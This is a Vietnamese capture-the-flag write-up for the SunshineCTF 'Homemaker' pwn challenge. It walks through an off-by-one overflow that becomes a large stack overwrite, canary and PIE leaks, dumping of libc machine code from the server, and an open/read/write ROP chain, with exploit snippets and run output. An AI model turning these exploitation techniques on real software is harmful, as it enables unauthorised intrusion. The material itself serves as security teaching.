---
title: "Homemaker — Pwn (Hard)"
date: 2026-09-28 17:42:43 +0700
lastmod_at: 2026-09-28 17:42:43 +0700
categories: [Pwn]
tags: [sunshinectf, Pwn]
image:
  path: /CTFWU/SunshineCTF%202026/homemaker/files/de.png
---
{% raw %}
**Flag:** `sun{the_future_is_now_today_well_wait_how_are_you_reading_this}`
**Instance:** `nc sunshinectf.games 26008`, file kèm theo chỉ có binary `homemaker`, không có libc.

## Đề bài

Bộ nạp thẻ đục lỗ: gửi thẻ lên, server kiểm key rồi chép thẻ vào bộ nhớ, và in bộ nhớ đó ra.
Không libc kèm theo, không hint.

Hai lỗi ghép lại thành lời giải. Vòng lặp nạp thẻ dùng `<=` nên ghi thừa đúng một byte, byte thừa
đó là CRC của chính frame nên người chọn được giá trị: `capacity` đi từ 256 lên 511 rồi lên
0x7f8, biến một overflow một byte thành overflow 2041 byte. Phần còn khó hơn: binary không có lấy
một lệnh `syscall`, mà libc của server thì không được cung cấp. Lời giải là dùng chính primitive
đọc bộ nhớ có được để lấy mã máy của libc từ server về, rồi đọc hai gadget cần thiết từ đó.

## Phân tích ban đầu

### Giao thức

Frame hai chiều giống hệt nhau:

```
ESC '[' <len:u16 BE> <payload[len]> <crc8(payload)> ESC '\'
```

`crc8` (hàm `0x11e9`) là nhân `x^8` trong `GF(2^8)` với đa thức `0x12f`:

```python
def crc8(data):
    acc = 0
    for b in data:
        acc ^= b
        for _ in range(8):
            acc = ((acc << 1) ^ 0x2F) & 0xFF if acc & 0x80 else (acc << 1) & 0xFF
    return acc
```

Lệnh 1 nhận thẻ dịch vụ, key so sánh cứng tại `0x12a7` là `0x1337c35f`. Lệnh 2 chép thẻ vào `mem`,
lệnh 3 in `mem` ra. Hết.

### Off-by-one ở hàm nạp thẻ (`0x174c`)

```c
n = len - 1;
if (n > capacity) return 0xe2;
for (i = 0; i <= n; ++i) mem[i] = p[1+i];      //  <=  là điểm chết: ghi n+1 byte
```

Vòng lặp bao gồm nên ghi `n+1` byte. Chọn `len = 257` thì `n = 256 = capacity`, byte thừa rơi đúng
`mem[256]` tức low byte của `capacity` (nằm tại `mem+0x100`), và giá trị ghi vào đó lại chính là
byte CRC của frame, thứ người gửi chọn tuỳ ý bằng cách sửa một byte cuối payload:

```python
def with_crc(payload, want):          # đổi byte cuối để crc8(payload) == want
    for x in range(256):
        p = bytearray(payload); p[-1] = x
        if crc8(bytes(p)) == want: return bytes(p)

serv.send(frame(with_crc(bytes([2]) + b"A"*256, 0xFF)))   # capacity: 0x100 -> 0x1FF
```

`capacity = 0x1FF` cho hai thứ: lệnh 3 in ra 511 byte của stack, và lệnh 2 được ghi tới 512 byte.
Trong 512 byte đó có `mem[0x100..0x101]` tức chính `capacity` (kểu u16), nên một thẻ 512 byte thứ
hai đặt tiếp `capacity = 0x7F8`. Vì `read_frame` chấp nhận payload tới `0x7F9` byte
(`len+7 <= 0x800`), một thẻ duy nhất phủ được `mem[0..0x7F8]` = 2041 byte, toàn bộ frame của
dispatcher.

### Leak (`0x1810`)

Layout vùng `mem` (dispatcher: `sub rsp, 0x120`; `mem = rbp-0x110`):

| offset | nội dung |
| --- | --- |
| `0x100` | `capacity` (u16) |
| `0x102` | số thẻ đã nạp (u16) |
| `0x108` | stack canary |
| `0x110` | saved rbp = rbp của `main`, suy ra địa chỉ stack |
| `0x118` | return address = `base + 0x1a9f`, suy ra PIE base |

```python
canary     = mem[0x108:0x110]
saved_rbp  = u64(mem[0x110])
retaddr    = u64(mem[0x118]);  base = retaddr - 0x1a9f
mema       = saved_rbp - 0x130          # đã kiểm chứng bằng cách đọc ngược lại chính nó
```

`mema` đáng tin vì ROP gọi `0x1810(mema)` in lại đúng nội dung thẻ vừa gửi.

## Các hướng đã loại

### `system()` không dẫn tới đâu

Binary import `system` và dispatcher có sẵn lệnh 5 gọi `system("/bin/echo -n ''")`, nên bẫy của
bài là "đưa ROP một chuỗi lệnh vào `mem` rồi gọi `system`". Đã thử nghiêm túc trên remote:

```
cmd=echo HIJI          0.55s  ...*** stack smashing detected ***: terminated
cmd=/bin/echo HIJI     0.52s  ...*** stack smashing detected ***: terminated
cmd=sleep 5            0.54s  ...*** stack smashing detected ***: terminated
```

Chuỗi "stack smashing" của `main` chứng minh `system()` chạy và return bình thường, và stderr có
đường ra socket. Nhưng `sleep 5` không gây trễ nào, tức process con không tồn tại: image của bài
không có `/bin/sh` (hoặc `clone` bị chặn). Mọi hướng shell đều đóng, chỉ còn ORW bằng syscall thô,
mà syscall thì binary không có:

```
$ python -c "d=open('files/homemaker','rb').read(); print(d.count(b'\x0f\x05'), d.count(b'\xcd\x80'))"
0 0
```

libc cũng không được cung cấp.

## Chuỗi khai thác

### Bước 1 - Lấy mã máy của libc từ server

`0x1810(ctx)` = `emit(0, ctx, [ctx+0x100])`: phát ra `len = [ctx+0x100]` byte tính từ `ctx`, kèm
ràng buộc `len + 8 <= 0x800`. Cho nên:

* Nếu `ctx` nằm trong vùng mình ghi được (chính thẻ 2041 byte) thì độ dài đọc do mình đặt, đọc
  tuỳ ý tối đa 2040 byte quanh stack, và đọc được cả `.bss`: đặt gate ở `base+0x4090` (bên trong
  buffer phát) cho phép `ctx = base+0x3F90` hút ra 2039 byte phủ `.dynamic` + `.got` + `.data` +
  `.bss`. Từ đó có `write`, `read`, `system`, `setvbuf`, `__libc_start_main` của libc trên server.
* Nếu `ctx` trỏ sang libc thì độ dài là hai byte may rủi. Vẫn thử được, vì hàm libc được xen bằng
  padding `0f 1f 40 00` và immediate 0, nên trong 256 byte kiểu gì cũng có vài vị trí cho
  `len <= 0x7f8`. Bắn 20 vị trí là ăn.

Mỗi probe kèm một marker đọc từ thẻ (`HMCARD!` + số thứ tự) để biết blob nào do `ctx` nào sinh ra.
Kết quả trên remote:

```
[*] write=0x7b9887cfd870
    hit  ctx=write+0x1764  len=1976      <- 1976 byte mã máy libc thật
    syscall   : write+0x1779, +0x17a9, +0x17d9, +0x180c, +0x1839, +0x1869, +0x1899
    pop rsi; ret : write+0x1a02          (0x5e 0xc3)
```

Toàn bộ wrapper có dạng `mov eax, imm; syscall; cmp rax,-4095; jae +1; ret`, nhảy thẳng vào
`syscall` thì sau đó cả hai nhánh (thành công và lỗi) đều `ret` về chain, nên dùng được như một
`syscall; ret`. Chạy lại ở connection khác, blob giống hệt từng byte khi quy về `write`.

Địa chỉ `write` của mỗi connection lấy từ đâu khi ASLR đổi liên tục? Từ dump stack: `mem[0x298]`
là một con trỏ trong mapping của libc, và hiệu `mem[0x298] - write` bằng đúng `0x11e790` trên cả ba
connection đo được. Không cần gọi ROP, không cần nhận dạng bản libc.

```python
w = u64(mem[0x298]) - 0x11E790
SYSCALL, POP_RSI = w + 0x1779, w + 0x1a02
```

### Bước 2 - Đặt tham số syscall không cần gadget `pop rsi/rdx/rax`

Ba quan sát:

1. Sau khi `0x1810(ctx)` return, `rsi = base+0x4060` (buffer phát, vùng `.bss` mình điều khiển
   được nội dung) và `rdx = len + 8`, tức độ dài đọc/ghi đặt bằng cách chọn gate trong thẻ.
2. `read@plt` và `write@plt` là wrapper thuần, chúng tự nạp `eax = 0` / `eax = 1`, nên không cần
   quan tâm `rax` đang là gì khi gọi hai hàm này.
3. Giá trị trả về của `read` là số byte đọc được. Nếu trong socket chỉ có đúng 2 byte thì `read`
   return 2, và syscall return không bị hàm nào ghi đè, nên `rax = 2 = __NR_open`. Muốn thế chỉ
   việc gửi đúng 2 byte.

`open(path, O_RDONLY, mode)`: `rdi` = path (có `pop rdi`), `rsi` = 0 (có `pop rsi` lấy từ libc),
`rdx` = mode bị bỏ qua khi không có `O_CREAT` nên giá trị rác không sao.

Chuỗi cuối (card 2041 byte: path tại `mem+0x600`, gate tại `mem+0x700` = 249 để `rdx = 257`, chain
tại `mem+0x118`):

```
pop rdi, mema+0x600 ; 0x1810        # rsi = emit buf, rdx = 257, rax = 0
pop rdi, 0          ; read@plt      # read(0, buf, 257): mình đưa đúng 2 byte -> rax = 2
pop rsi, 0                          # flags = O_RDONLY
pop rdi, mema+0x600                 # rdi = "/ctf/flag.txt"
syscall                             # open  -> rax = fd (3)
pop rdi, mema+0x600 ; 0x1810        # rsi = buffer, rdx = 257
pop rdi, 3          ; read@plt      # read(3, emit buf, 257)  -> cờ vào .bss
pop rdi, 1          ; write@plt     # write(1, emit buf, 257) -> cờ ra socket
```

Không cần shell, không cần libc base, và chỉ cần đúng hai địa chỉ đọc được từ chính server.

## Flag

```
$ python exploit_homemaker.py 3
[+] base=0x58c6dfbcf000 mema=0x7ffec7f52670 canary=00b00b45f118c013 (dump 2040 bytes, crc ok=True)
[*] write=0x7c49b6240870  syscall=0x7c49b6241fe9  pop_rsi=0x7c49b6242272  chain=184 bytes
[*] 1036 bytes back:
...
sun{the_future_is_now_today_well_wait_how_are_you_reading_this}

[+] FLAG: sun{the_future_is_now_today_well_wait_how_are_you_reading_this}
```

## Reproduce

```bash
python exploit_homemaker.py 3        # 3 = số lần thử; cần hmlib.py cùng thư mục
```

{% endraw %}
